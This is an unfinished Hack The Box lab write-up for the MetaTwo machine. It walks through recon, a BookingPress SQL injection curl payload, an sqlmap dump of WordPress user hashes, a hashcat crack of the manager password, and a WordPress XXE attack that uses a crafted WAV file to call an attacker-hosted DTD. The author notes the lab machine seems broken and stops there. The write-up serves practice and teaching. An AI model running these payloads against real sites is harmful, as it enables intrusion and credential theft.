# HTB -  MetaTWO
# IP: 10.10.11.186
# Start: 26/02/23

## Info gathering

### Nmap

#### metatwo.htb
```
nmap -sV -sC metatwo.htb- Pn                                                                                                                                                                î‚² 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-26 12:06 GMT
Nmap scan report for metatwo.htb (10.10.11.186)
Host is up (0.012s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c4b44617d2102d8fec1dc927fecd79ee (RSA)
|   256 2aea2fcb23e8c529409cab866dcd4411 (ECDSA)
|_  256 fd78c0b0e22016fa050debd83f12a4ab (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://metapress.htb/
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.93%I=7%D=2/26%Time=63FB4B3D%P=x86_64-pc-linux-gnu%r(Gene
SF:ricLines,8F,"220\x20ProFTPD\x20Server\x20\(Debian\)\x20\[::ffff:10\.10\
SF:.11\.186\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20cre
SF:ative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creative
SF:\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
Interesting:
- FTP port (proFTP)
- webserver redirects to metapress.htb

#### metapress.htb

same as previous run aside from http site
```
80/tcp open  http    nginx 1.18.0
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-generator: WordPress 5.6.2
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: nginx/1.18.0
|_http-title: MetaPress &#8211; Official company site
```
Interesting:
- Wordpress site
- robots.txt tells us of an interesting folder
- sessionid can be read by scripts, potentially allowing token stealing
- path /evox/about may be valid

### Web access

#### http://metapress.htb/ mirrors http://metapress.htb/hello-world

Basic under construction page

interesting links:
- http://metapress.htb/wp-json/
- http://metapress.htb/xmlrpc.php?rsd
- http://metapress.htb/wp-includes/wlwmanifest.xml


#### http://metapress.htb/events

Event form with fillable fields

Interesting:
- POST /wp-admin/admin-ajax.php filling out form (wordpress plugin most likely)

#### http://metapress.htb/about-us/

Under construction about page

Interesting:
- Search button -> http://metapress.htb/?s=

#### Other pages:

These were found by performing an empty search on the /?s page

- http://metapress.htb/cancel-payment/
- http://metapress.htb/cancel-appointment/
- http://metapress.htb/sample-page/ (link to http://metapress.htb/wp-admin/)
- http://metapress.htb/thank-you/ (calls to /wp-content/plugins/bookingpress-appointment-booking)

#### Next steps

ok so it's a wordpress site, that much is clear.
I know about potentially brute forcing through xmlrpc.php, but first i'd like some more info, so i'll use wpscan.

```
wpscan --url http://metapress.htb -e vp,vt --plugins-detection mixed  

[+] WordPress version 5.6.2 identified (Insecure, released on 2021-02-22).
[+] WordPress theme in use: twentytwentyone
 | Location: http://metapress.htb/wp-content/themes/twentytwentyone/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://metapress.htb/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 1.7
```
these are interesting but after checking they don't offer any vulnerabilities in the way of unautorized access.

i dont have a wpscan account, but we know of at least one plugin used (bookingpress), and it turns out that there is an SQL injection avaliable for a certain version, so lets check the version.

Without having wpscan for this, i searched pages for links to http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking and came across many links that looked like `<link rel='stylesheet' id='bookingpress_fonts_css-css'  href='http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/fonts/fonts.css?ver=1.0.10' media='all' />`

ver=1.0.10 which is within the bounds of the vulnerability! < 10.0.11
https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357

This page also gives a PoC
it seems that with a nonce generated by the booking plugin you can access the action "bookingpress_front_get_catagory_services", along with providing the nonce, a "category id", and a value for "total service", within this last value, entering a ')' character will escape some string which is directly used in an SQL statement.

So lets craft a payload!

```
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' -data 'action=bookingpress_front_get_category_services&_wpnonce=5c87274b9d&category_id=1&total_service=1) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
```

```
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Sun, 26 Feb 2023 13:59:39 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/8.0.24
X-Robots-Tag: noindex
X-Content-Type-Options: nosniff
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
X-Frame-Options: SAMEORIGIN
Referrer-Policy: strict-origin-when-cross-origin

[{"bookingpress_service_id":"1","bookingpress_category_id":"1","bookingpress_service_name":"Startup meeting","bookingpress_service_price":"$0.00","bookingpress_service_duration_val":"30","bookingpress_service_duration_unit":"m","bookingpress_service_description":"Join us, we will celebrate our startup!","bookingpress_service_position":"0","bookingpress_servicedate_created":"2022-06-23 18:02:38","service_price_without_currency":0,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"},{"bookingpress_service_id":"10.5.15-MariaDB-0+deb11u1","bookingpress_category_id":"Debian 11","bookingpress_service_name":"debian-linux-gnu","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"2","bookingpress_service_duration_unit":"3","bookingpress_service_description":"4","bookingpress_service_position":"5","bookingpress_servicedate_created":"6","service_price_without_currency":1,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]% 
```

SQL INJECTION! We see `{"bookingpress_service_id":"10.5.15-MariaDB-0+deb11u1","bookingpress_category_id":"Debian 11","bookingpress_service_name":"debian-linux-gnu"` 
I've been looking at hackerone recently, this would be the point where i would report this to the company.

But i'm in the role of the threat now so on we go!

## Exploitation

### SQLMAP
So now i know i can execute sql, i'll use sqlmap to do the heavy lifting, i cant get os control directly unfortunately, i'll include the output of the sqlmap session in this github page.

python3 ./sqlmap.py -u 'http://metapress.htb/wp-admin/admin-ajax.php' --data='action=bookingpress_front_get_category_services&_wpnonce=5c87274b9d&category_id=1&total_service=1'

from dumping wp_users table
```
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| ID | user_url             | user_pass                          | user_email            | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key |
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| 1  | http://metapress.htb | $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. | admin@metapress.htb   | admin      | 0           | admin        | admin         | 2022-06-23 17:58:28 | <blank>             |
| 2  | <blank>              | $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 | manager@metapress.htb | manager    | 0           | manager      | manager       | 2022-06-23 18:07:55 | <blank>             |
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
```

### HASHCAT

I'll be trying to crack these passwords as they are md5

```
./hashcat.bin -a 0 -m 400 '/home/elliot/Learning/Writeups/HackTheBox/MetaTwo/admin.hash' ../Lists/rockyou.txt                                         
hashcat (v6.2.6) starting

OpenCL API (OpenCL 2.1 AMD-APP.dbg (3513.0)) - Platform #1 [Advanced Micro Devices, Inc.]
=========================================================================================
* Device #1: AMD Radeon RX 6700 XT, 12160/12272 MB (10431 MB allocatable), 20MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 2 digests; 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1470 MB

Dictionary cache hit:
* Filename..: ../Lists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70:partylikearockstar    

```

We now have the password for the "manager" account! Lets go use it.

Under the manager account i have the ability to upload new media, as i know this page is running php8 i will attempt to upload a php shell.
Unfortunately this file type is not allowed.

Now that i have more access, i will revisit the previously mentioned Wordpress version, 5.6.2 has a few vulnerabilities all of its own: https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5

`WordPress 5.6-5.7 - Authenticated XXE Within the Media Library Affecting PHP 8`: https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5

An XXE (XML External Entity) attack is where we can insert crafted XML entities into a page which doesn't parse or sanitize input correctly.
XML Entities can be any data, but typically we use the SYSTEM entity to run commands, read files, etc.

https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
https://portswigger.net/web-security/xxe/xml-entities

To read a file, we would insert something like `<!ENTITY ext SYSTEM "file:///path/to/file" >` and read `&ext` or if the php expect module is loaded, we can achieve code execution like `<!ENTITY r SYSTEM "expect://echo hello"` and read `&r`

As the wpscan referenced above says, this XXE vulnerabilty resides in the audio parser that wordpress uses, called ID3, when parsing WAVE files. 

So we need to craft a .wav file to exploit this, so i lookup the wave file header, insert that first and then i will add my crafted XML.
```


RIFF300WAVEBBBBiXML<!DOCTYPE f [
<!ENTITY % xxe SYSTEM "http://10.10.14.22:8000/crafted.dtd"> %xxe;]>
```

# END TBD
unfortunately it looks like the htb machine may be borked, i have tried a few XXE attacks and even went so far as to copy exactly another walkthrough which also failed on the page, i will come back to this if the site is fixed.